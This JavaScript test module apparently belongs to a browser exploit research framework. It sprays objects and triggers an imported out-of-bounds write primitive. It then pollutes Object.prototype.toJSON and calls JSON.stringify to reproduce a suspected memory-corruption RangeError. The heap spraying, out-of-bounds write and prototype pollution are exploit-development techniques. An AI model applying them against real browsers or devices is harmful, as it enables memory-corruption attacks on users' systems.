// js/script3/testRevisitOriginalRangeError.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProperty = "clean";
        // Adicionar algumas propriedades a mais para aumentar a chance do for...in ser longo
        this.propA = "propA_val";
        this.propB = 1000;
        this.propC = true;
        this.propD = { nested: "value" };
        this.propE = [10, 20, 30];

    }

    checkIntegrity(loggerFunc = logS3) {
        // Apenas uma verificação básica do marcador, pois o objeto pode estar instável
        const currentId = this.id || "ID_DESCONHECIDO";
        if (this.marker !== 0xCAFECAFE) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)}`, 'critical', 'checkIntegrity');
            return false;
        }
        return true;
    }
}

// Tentativa de recriar a toJSON que originalmente causou RangeError
// Iterar sobre TODAS as propriedades 'hasOwnProperty' e tentar String(this[prop]).substring()
export function toJSON_ProbeGenericObject_OriginalRisk() {
    const FNAME_toJSON = "toJSON_ProbeGenericObject_OriginalRisk";
    let props_payload = {
        // Adiciona um marcador para identificar que esta toJSON foi executada
        _toJSON_EXECUTED_MARKER_: FNAME_toJSON,
        _this_type_at_entry_: Object.prototype.toString.call(this),
        _id_at_entry_: (this && typeof this.id !== 'undefined' ? String(this.id) : "N/A_OR_NO_ID")
    };
    let iteration_count = 0;
    // Log de entrada mínimo para não interferir muito se o timing for sensível
    // console.log(`[${FNAME_toJSON}] Entrando. this.id: ${props_payload._id_at_entry_}`);

    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop)) {
                    if (typeof this[prop] !== 'function') { // Evitar serializar funções
                        // Esta é a operação que suspeitamos causar problemas sob certas condições
                        props_payload[prop] = String(this[prop]).substring(0, 50);
                    }
                }
                // Safety break para o caso de um loop genuinamente infinito não pego pelo RangeError do JS
                if (iteration_count > 200) { // Aumentado um pouco, mas ainda deve ser menor que o limite da pilha
                    logS3(`[${FNAME_toJSON}] Loop for...in excedeu 200 iterações. ID: ${props_payload._id_at_entry_}. Interrompendo.`, "warn", FNAME_toJSON);
                    props_payload._LOOP_BREAK_SAFETY_ = iteration_count;
                    break;
                }
            }
        }
    } catch (e) {
        // Se um erro for pego AQUI (DENTRO da toJSON), ele não é o RangeError do JSON.stringify, mas um erro na nossa lógica.
        logS3(`[${FNAME_toJSON}] ERRO INTERNO na toJSON (não o RangeError do stringify): ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        props_payload._INTERNAL_ERROR_ = `${e.name}: ${e.message}`;
    }
    props_payload._iterations_done_ = iteration_count;
    // console.log(`[${FNAME_toJSON}] Saindo. Iterações: ${iteration_count}`);
    return props_payload;
}


export async function executeRevisitOriginalRangeErrorTest() {
    const FNAME_TEST = `executeRevisitOriginalRangeErrorTest`;
    const toJSONFunctionName = "toJSON_ProbeGenericObject_OriginalRisk";
    logS3(`--- Iniciando Teste: Revisitando RangeError Original com ${toJSONFunctionName} ---`, "test", FNAME_TEST);
    document.title = `Revisit Original RangeError`;

    const spray_count = 50; // Pode aumentar para 200 se o primeiro não mostrar
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return { setupError: e_spray };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e escrevendo 0xFFFFFFFF em oob_ab[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed")};
    }
    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando o primeiro objeto pulverizado (sprayed_objects[0]) com ${toJSONFunctionName}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let result = {
        targetObjectId: null,
        stringifyError: null,
        toJSONReturn: null,
    };

    // Focar no primeiro objeto, pois o RangeError original ocorreu nele
    const target_obj = sprayed_objects[0];
    if (!target_obj) {
        logS3("ERRO: Nenhum objeto pulverizado para testar.", "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: new Error("No sprayed objects") };
    }
    result.targetObjectId = target_obj.id;

    try {
        logS3(`   Integridade de ${target_obj.id} ANTES de JSON.stringify: ${target_obj.checkIntegrity(null)}`, "info", FNAME_TEST);

        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ProbeGenericObject_OriginalRisk,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        logS3(`   Chamando JSON.stringify(${target_obj.id}) usando ${toJSONFunctionName}... (ESPERANDO RANGEERROR POTENCIAL)`, 'warn', FNAME_TEST);
        document.title = `Stringify ${target_obj.id} - ${toJSONFunctionName}`;
        try {
            result.toJSONReturn = JSON.stringify(target_obj); // PONTO CRÍTICO
            logS3(`     JSON.stringify(${target_obj.id}) COMPLETADO INESPERADAMENTE. Retorno da toJSON: ${JSON.stringify(result.toJSONReturn)}`, "warn", FNAME_TEST);
        } catch (e_str) { // Captura o RangeError ou outros erros do stringify
            result.stringifyError = { name: e_str.name, message: e_str.message, stack: e_str.stack };
            logS3(`     !!!! ERRO CAPTURADO AO STRINGIFY ${target_obj.id} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error"); // Loga a stack trace se disponível
        }

        logS3(`   Integridade de ${target_obj.id} APÓS JSON.stringify: ${target_obj.checkIntegrity(null)}`, "info", FNAME_TEST);

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do teste para ${target_obj.id}: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        if (!result.stringifyError) result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para ${target_obj.id}! (Comportamento esperado/anterior)`, "vuln", FNAME_TEST);
        document.title = `RangeError REPRODUCED with ${toJSONFunctionName}!`;
    } else if (result.stringifyError) {
        logS3(`   Outro erro (${result.stringifyError.name}) ocorreu com ${toJSONFunctionName} para ${target_obj.id}.`, "error", FNAME_TEST);
    } else {
        logS3(`   ${toJSONFunctionName} para ${target_obj.id} completou SEM RangeError. O Heisenbug pode ter mudado.`, "warn", FNAME_TEST);
    }

    logS3(`--- Sub-Teste com ${toJSONFunctionName} (Revisitando RangeError Original) CONCLUÍDO ---`, "subtest", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    return result;
}
